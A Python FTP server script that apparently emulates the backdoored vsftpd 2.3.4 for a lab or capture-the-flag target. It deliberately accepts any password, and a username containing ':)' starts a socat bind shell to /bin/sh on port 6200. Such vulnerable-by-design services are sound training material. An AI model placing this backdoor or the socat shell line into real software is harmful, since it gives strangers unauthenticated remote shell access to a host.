#!/usr/bin/env python3
import os
import socket
import subprocess
import threading
from pathlib import Path

HOST = "0.0.0.0"
PORT = 21
ROOT = Path("/srv/ftp").resolve()
BACKDOOR_PORT = 6200
backdoor_started = False
backdoor_lock = threading.Lock()


def ftp_path(cwd, arg):
    raw = arg.strip() if arg else ""
    if raw.startswith("/"):
        candidate = (ROOT / raw.lstrip("/")).resolve()
    else:
        candidate = (ROOT / cwd.lstrip("/") / raw).resolve()
    if ROOT not in candidate.parents and candidate != ROOT:
        return ROOT
    return candidate


def start_backdoor():
    global backdoor_started
    with backdoor_lock:
        if backdoor_started:
            return
        subprocess.Popen([
            "socat",
            f"TCP-LISTEN:{BACKDOOR_PORT},reuseaddr,fork",
            "EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",
        ])
        backdoor_started = True


class Session:
    def __init__(self, conn, addr):
        self.conn = conn
        self.addr = addr
        self.cwd = "/"
        self.pasv_sock = None

    def send(self, line):
        self.conn.sendall((line + "\r\n").encode())

    def recvline(self):
        data = b""
        while not data.endswith(b"\n"):
            chunk = self.conn.recv(1)
            if not chunk:
                return ""
            data += chunk
        return data.decode(errors="ignore").strip()

    def open_data(self):
        if not self.pasv_sock:
            self.send("425 Use PASV first.")
            return None
        data_conn, _ = self.pasv_sock.accept()
        self.pasv_sock.close()
        self.pasv_sock = None
        return data_conn

    def list_dir(self, arg):
        target = ftp_path(self.cwd, arg or ".")
        if not target.is_dir():
            self.send("550 Not a directory.")
            return
        self.send("150 Opening ASCII mode data connection for file list.")
        data = self.open_data()
        if not data:
            return
        with data:
            for item in sorted(target.iterdir()):
                mode = "drwxr-xr-x" if item.is_dir() else "-rw-r--r--"
                size = item.stat().st_size
                name = item.name
                data.sendall(f"{mode} 1 ftp ftp {size:>8} Jan 01 00:00 {name}\r\n".encode())
        self.send("226 Transfer complete.")

    def retr(self, arg):
        target = ftp_path(self.cwd, arg)
        if not target.is_file():
            self.send("550 File unavailable.")
            return
        self.send("150 Opening binary mode data connection.")
        data = self.open_data()
        if not data:
            return
        with data, target.open("rb") as fh:
            while True:
                chunk = fh.read(8192)
                if not chunk:
                    break
                data.sendall(chunk)
        self.send("226 Transfer complete.")

    def run(self):
        self.send("220 (vsftpd 2.3.4)")
        while True:
            line = self.recvline()
            if not line:
                break
            cmd, _, arg = line.partition(" ")
            cmd = cmd.upper()
            if cmd == "USER":
                if ":)" in arg:
                    start_backdoor()
                self.send("331 Please specify the password.")
            elif cmd == "PASS":
                self.send("230 Login successful.")
            elif cmd == "SYST":
                self.send("215 UNIX Type: L8")
            elif cmd == "FEAT":
                self.send("211-Features")
                self.send(" PASV")
                self.send(" UTF8")
                self.send("211 End")
            elif cmd == "TYPE":
                self.send("200 Switching type.")
            elif cmd == "PWD":
                self.send(f'257 "{self.cwd}"')
            elif cmd == "CWD":
                target = ftp_path(self.cwd, arg)
                if target.is_dir():
                    rel = "/" + str(target.relative_to(ROOT))
                    self.cwd = "/" if rel == "/." else rel.rstrip("/")
                    self.send("250 Directory successfully changed.")
                else:
                    self.send("550 Failed to change directory.")
            elif cmd == "PASV":
                if self.pasv_sock:
                    self.pasv_sock.close()
                self.pasv_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.pasv_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.pasv_sock.bind((HOST, 0))
                self.pasv_sock.listen(1)
                ip = self.conn.getsockname()[0]
                if ip == "0.0.0.0":
                    ip = "10.10.20.41"
                port = self.pasv_sock.getsockname()[1]
                p1, p2 = divmod(port, 256)
                self.send(f"227 Entering Passive Mode ({ip.replace('.', ',')},{p1},{p2}).")
            elif cmd in ("LIST", "NLST"):
                self.list_dir(arg)
            elif cmd == "RETR":
                self.retr(arg)
            elif cmd == "NOOP":
                self.send("200 NOOP ok.")
            elif cmd == "QUIT":
                self.send("221 Goodbye.")
                break
            else:
                self.send("502 Command not implemented.")


def main():
    os.chdir(str(ROOT))
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(20)
    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=Session(conn, addr).run, daemon=True)
        thread.start()


if __name__ == "__main__":
    main()
